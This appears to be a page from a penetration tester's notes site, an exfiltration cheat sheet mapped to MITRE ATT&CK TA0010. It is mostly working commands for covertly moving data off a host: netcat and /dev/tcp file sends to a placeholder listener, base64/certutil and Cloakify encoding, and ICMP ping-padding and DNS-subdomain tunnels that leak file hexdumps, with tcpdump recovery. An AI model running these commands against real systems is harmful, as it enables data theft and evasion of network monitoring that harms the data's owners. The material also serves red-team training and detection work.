---
title: Exfiltration
weight: 600
---

# Exfiltration

Data exfiltration,
also called data extrusion or data exportation,
is the unauthorized transfer of data
from a device or network.[^mitre-exfiltration]

## Encoding

### Base64

Linux encoding/decoding.

```sh
cat {{< param "m.TFILE" >}} | base64 -w0
```

```sh
cat {{< param "m.TFILE" >}} | base64 -d
```

{{<details "Parameters">}}
- `-w<col>`:  wrap encoded lines after `<col>` character (default 76).
- `-d`: decode data.
{{</details>}}

Windows encoding/decoding.

```ps
certutil -encode {{< param "m.TFILE" >}} output.ext
```

```ps
certutil -decode {{< param "m.TFILE" >}} output.ext
```

### Steganography

#### Cloakify [^cloakify]
```sh
python ./cloakify.py {{< param "m.TFILE" >}} ./ciphers/topWebsites
```

Alternatively:

```sh
python ./cloakifyFactory
```

## File Transfer

#### wget (recursive)

```sh
wget -r {{< param "m.RHOST" >}}:{{< param "m.LPORT" >}}
```
{{<details "Parameters">}}
- `-r`: Specify recursive download.
{{</details>}}

#### curl
```sh
curl {{< param "m.RHOST" >}}/{{< param "m.TFILE" >}} -o {{< param "m.TFILE" >}}
```
{{<details "Parameters">}}
- `-o <file>`:  Write to `<file>` instead of stdout.
{{</details>}}

#### scp
```sh
scp user@{{< param "m.RHOST" >}}:/{{< param "m.TFILE" >}} .
```

#### nc

```sh
# Receiver
nc -nvlp {{< param "m.LPORT" >}} > {{< param "m.TFILE" >}}
# Sender
nc -nv {{< param "m.LHOST" >}} {{< param "m.LPORT" >}} < {{< param "m.TFILE" >}}
```

{{<details "Parameters">}}
- `n`: don't do DNS lookups.
- `v`: prints status messages.
- `l`: listen.
- `p <port>`: local port used for listening.
{{</details>}}

#### `/dev/tcp` [^devref]
```sh
# Receiver
nc -nvlp {{< param "m.LPORT" >}} > {{< param "m.TFILE" >}}
# Sender
cat {{< param "m.TFILE" >}} > /dev/tcp/{{< param "m.LHOST" >}}/{{< param "m.LPORT" >}}
```

```sh
# Sender
nc -w5 -nvlp {{< param "m.LPORT" >}} < {{< param "m.TFILE" >}}
# Receiver
exec 6< /dev/tcp/{{< param "m.LHOST" >}}/{{< param "m.LPORT" >}}
cat <&6 > {{< param "m.TFILE" >}}
```

## Web Servers

### Python

```sh
python -m SimpleHTTPServer {{< param "m.LPORT" >}}
python3 -m http.server {{< param "m.LPORT" >}}
```

[Simple HTTP Server with File Upload](https://gist.github.com/touilleMan/eb02ea40b93e52604938)

### Ruby

```sh
ruby -run -e httpd . -p{{< param "m.LPORT" >}}
```

```sh
ruby -r webrick -e 'WEBrick::HTTPServer.new(:Port => {{< param "m.LPORT" >}}, :DocumentRoot => Dir.pwd).start'
```

### Perl

```sh
perl -MHTTP::Daemon -e '$d = HTTP::Daemon->new(LocalPort => {{< param "m.LPORT" >}}) or  +die $!; while($c = $d->accept){while($r = $c->get_request){+$c->send_file_response(".".$r->url->path)}}'
```

{{<hint m.ING>}}
Install `HTTP:Daemon` if not present with: `sudo cpan HTTP::Daemon`
{{</hint>}}

### PHP

```sh
php -S 127.0.0.1:{{< param "m.LPORT" >}}
```

### NodeJS

[http-server](https://www.npmjs.com/package/http-server)

```sh
npm install -g http-server
http-server -p {{< param "m.LPORT" >}}
```

[node-static](https://www.npmjs.com/package/node-static)

```sh
npm install -g node-static
static -p {{< param "m.LPORT" >}}
```

## FTP Servers

### Python

```sh
pip install pyftpdlib
python3 -m pyftpdlib -p {{< param "m.LPORT" >}}
```

### NodeJS

```sh
npm install -g ftp-srv
ftp-srv ftp://0.0.0.0:{{< param "m.LPORT" >}} --root ./
```

## Tunneling

### ICMP

Capture ICMP packets
with the following script:

{{<gist maxrodrigo a7a8c4bd7dfe64eb305b4c70dee70233 >}}

Generate ICMP packets from the file hexdump.

```sh
xxd -p -c 8 {{< param "m.TFILE" >}} | while read h; do ping -c 1 -p $h {{< param "m.RHOST" >}}; done
```

{{<details "Parameters">}}

`xxd`:
- `-p`: Output  in postscript continuous hexdump style. Also known as plain hexdump style.
- `-c <cols>`: Format `<cols>` octets per line.

`ping`:
- `-c <count>`: Stop after sending `<count>` `ECHO_REQUEST` packets.
- `-p`: You may specify up to 16 "pad" bytes to fill out the packet you send.
{{</details>}}

{{<hint m.ING>}}
Match `xxd` columns (`-c 8`) with the data sliced (`packet[ICMP].load[-8:]`) in the script.
{{</hint>}}

### DNS

Capture DNS packets data.

```sh
sudo tcpdump -n -i {{< param "m.LIFACE" >}} -w dns_exfil.pcap udp and src {{< param "m.RHOST" >}} and port 53
```

{{<hint m.ING>}}
Remember to point the DNS resolution to where packages are being captured.
{{</hint>}}

Generate DNS queries.

```sh
xxd -p -c 16 {{< param "m.TFILE" >}} | while read h; do ping -c 1 ${h}.domain.com; done
```

Extract exfiltrated data.

```sh
tcpdump -r dns-exfil.pcap 2>/dev/null | sed -e 's/.*\ \([A-Za-z0-9+/]*\).domain.com.*/\1/' | uniq | paste -sd "" - | xxd -r -p
```

#### PacketWhisper [^packetwhisper]

Capture packages with `tcpdump`,
as described above.
Cloak, exfiltrate and decloak from the cli.

```sh
sudo packetWhisper.py
```

## Further Reading

- [Python HTTPS Simple Server](https://www.maxrodrigo.com/notes/python-https-simple-server.html)

[^mitre-exfiltration]: “Exfiltration, Tactic TA0010 - Enterprise.” MITRE ATT&CK®, https://attack.mitre.org/tactics/TA0010/.
[^cloakify]: TryCatchHCF. “TryCatchHCF/Cloakify: CloakifyFactory.” GitHub, https://github.com/TryCatchHCF/Cloakify.
[^devref]: “/Dev.” The Linux Documentation Project, https://tldp.org/LDP/abs/html/devref1.html.
[^packetwhisper]: TryCatchHCF. “PacketWhisper.” GitHub, https://github.com/TryCatchHCF/PacketWhisper.
